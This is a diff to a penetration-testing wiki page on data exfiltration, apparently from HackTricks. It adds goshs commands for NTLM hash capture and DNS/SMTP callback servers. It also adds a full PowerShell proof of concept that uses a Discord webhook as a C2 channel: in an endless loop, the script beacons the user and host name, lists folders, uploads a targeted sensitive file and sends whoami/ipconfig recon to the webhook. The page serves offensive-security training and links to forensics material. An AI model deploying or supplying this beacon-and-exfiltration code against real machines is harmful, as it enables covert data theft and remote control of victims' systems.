@@ -2,6 +2,13 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
+> [!TIP]
+> For an end-to-end example of staging loot in `C:\Users\Public` and exfiltrating it with Rclone to mimic legitimate backups, review the workflow below.
+
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
 ## Commonly whitelisted domains to exfiltrate information
 
 Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
@@ -112,6 +119,128 @@ if __name__ == "__main__":
 ###
 ```
 
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) is a single-binary replacement for `python3 -m http.server` 
+with upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links, 
+and OOB collaboration features (DNS, SMTP, NTLM hash capture).
+
+```bash
+# Serve current directory on port 8000
+goshs
+
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
+
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
+
+Webhooks are write-only HTTPS endpoints that accept JSON and optional file parts. They’re commonly allowed to trusted SaaS domains and require no OAuth/API keys, making them useful for low-friction beaconing and exfiltration.
+
+Key ideas:
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
+
+PowerShell PoC (Discord):
+
+```powershell
+# 1) Configure webhook and optional target file
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"
+
+# 2) Reuse a single HttpClient
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordText {
+    param([string]$Text)
+    $payload = @{ content = $Text } | ConvertTo-Json -Compress
+    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+    $mp = New-Object System.Net.Http.MultipartFormDataContent
+    $mp.Add($jsonContent, "payload_json")
+    $resp = $client.PostAsync($webhook, $mp).Result
+    Write-Host "[Discord] text -> $($resp.StatusCode)"
+}
+
+function Send-DiscordFile {
+    param([string]$Path, [string]$Name)
+    if (-not (Test-Path $Path)) { return }
+    $bytes = [System.IO.File]::ReadAllBytes($Path)
+    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+    $mp = New-Object System.Net.Http.MultipartFormDataContent
+    $mp.Add($jsonContent, "payload_json")
+    $mp.Add($fileContent, "file", $Name)
+    $resp = $client.PostAsync($webhook, $mp).Result
+    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+# 3) Beacon/recon/exfil loop
+$ctr = 0
+while ($true) {
+    $ctr++
+    # Beacon
+    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
+    Send-DiscordText -Text $beacon
+
+    # Every 2nd: quick folder listing
+    if ($ctr % 2 -eq 0) {
+        $dirs = @("Documents","Desktop","Downloads","Pictures")
+        $acc = foreach ($d in $dirs) {
+            $p = Join-Path $env:USERPROFILE $d
+            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
+            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
+        }
+        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
+    }
+
+    # Every 3rd: targeted exfil
+    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }
+
+    # Every 4th: basic recon
+    if ($ctr % 4 -eq 0) {
+        $who = whoami
+        $ip  = ipconfig | Out-String
+        $tmp = Join-Path $env:TEMP "recon.txt"
+        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
+        Send-DiscordFile -Path $tmp -Name "recon.txt"
+    }
+
+    Start-Sleep -Seconds 20
+}
+```
+
+Notes:
+- Similar patterns apply to other collaboration platforms (Slack/Teams) using their incoming webhooks; adjust URL and JSON schema accordingly.
+- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see:
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
+{{#endref}}
+
 ## FTP
 
 ### FTP server (python)
@@ -199,6 +328,18 @@ WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.1
 WindPS-2> cd new_disk:
 ```
 
+### goshs
+[goshs](https://github.com/patrickhener/goshs) is a single-binary alternative 
+that serves files over SMB and captures NetNTLMv2 hashes from connecting clients:
+
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
+
 ## SCP
 
 The attacker has to have SSHd running.
@@ -270,6 +411,24 @@ If you can send data to an SMTP server, you can create an SMTP to receive the da
 
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
+```
+
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) can spin up a quick SMTP server
+to catch email callbacks during OOB exfiltration scenarios:
+
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+
+Received emails and callbacks are displayed directly in the terminal output.
+Can be combined with the DNS callback server for full OOB coverage:
+
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 ```
 
 ## TFTP
@@ -363,8 +522,12 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
+
+## References
+
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
 {{#include ../banners/hacktricks-training.md}}
-
-
-
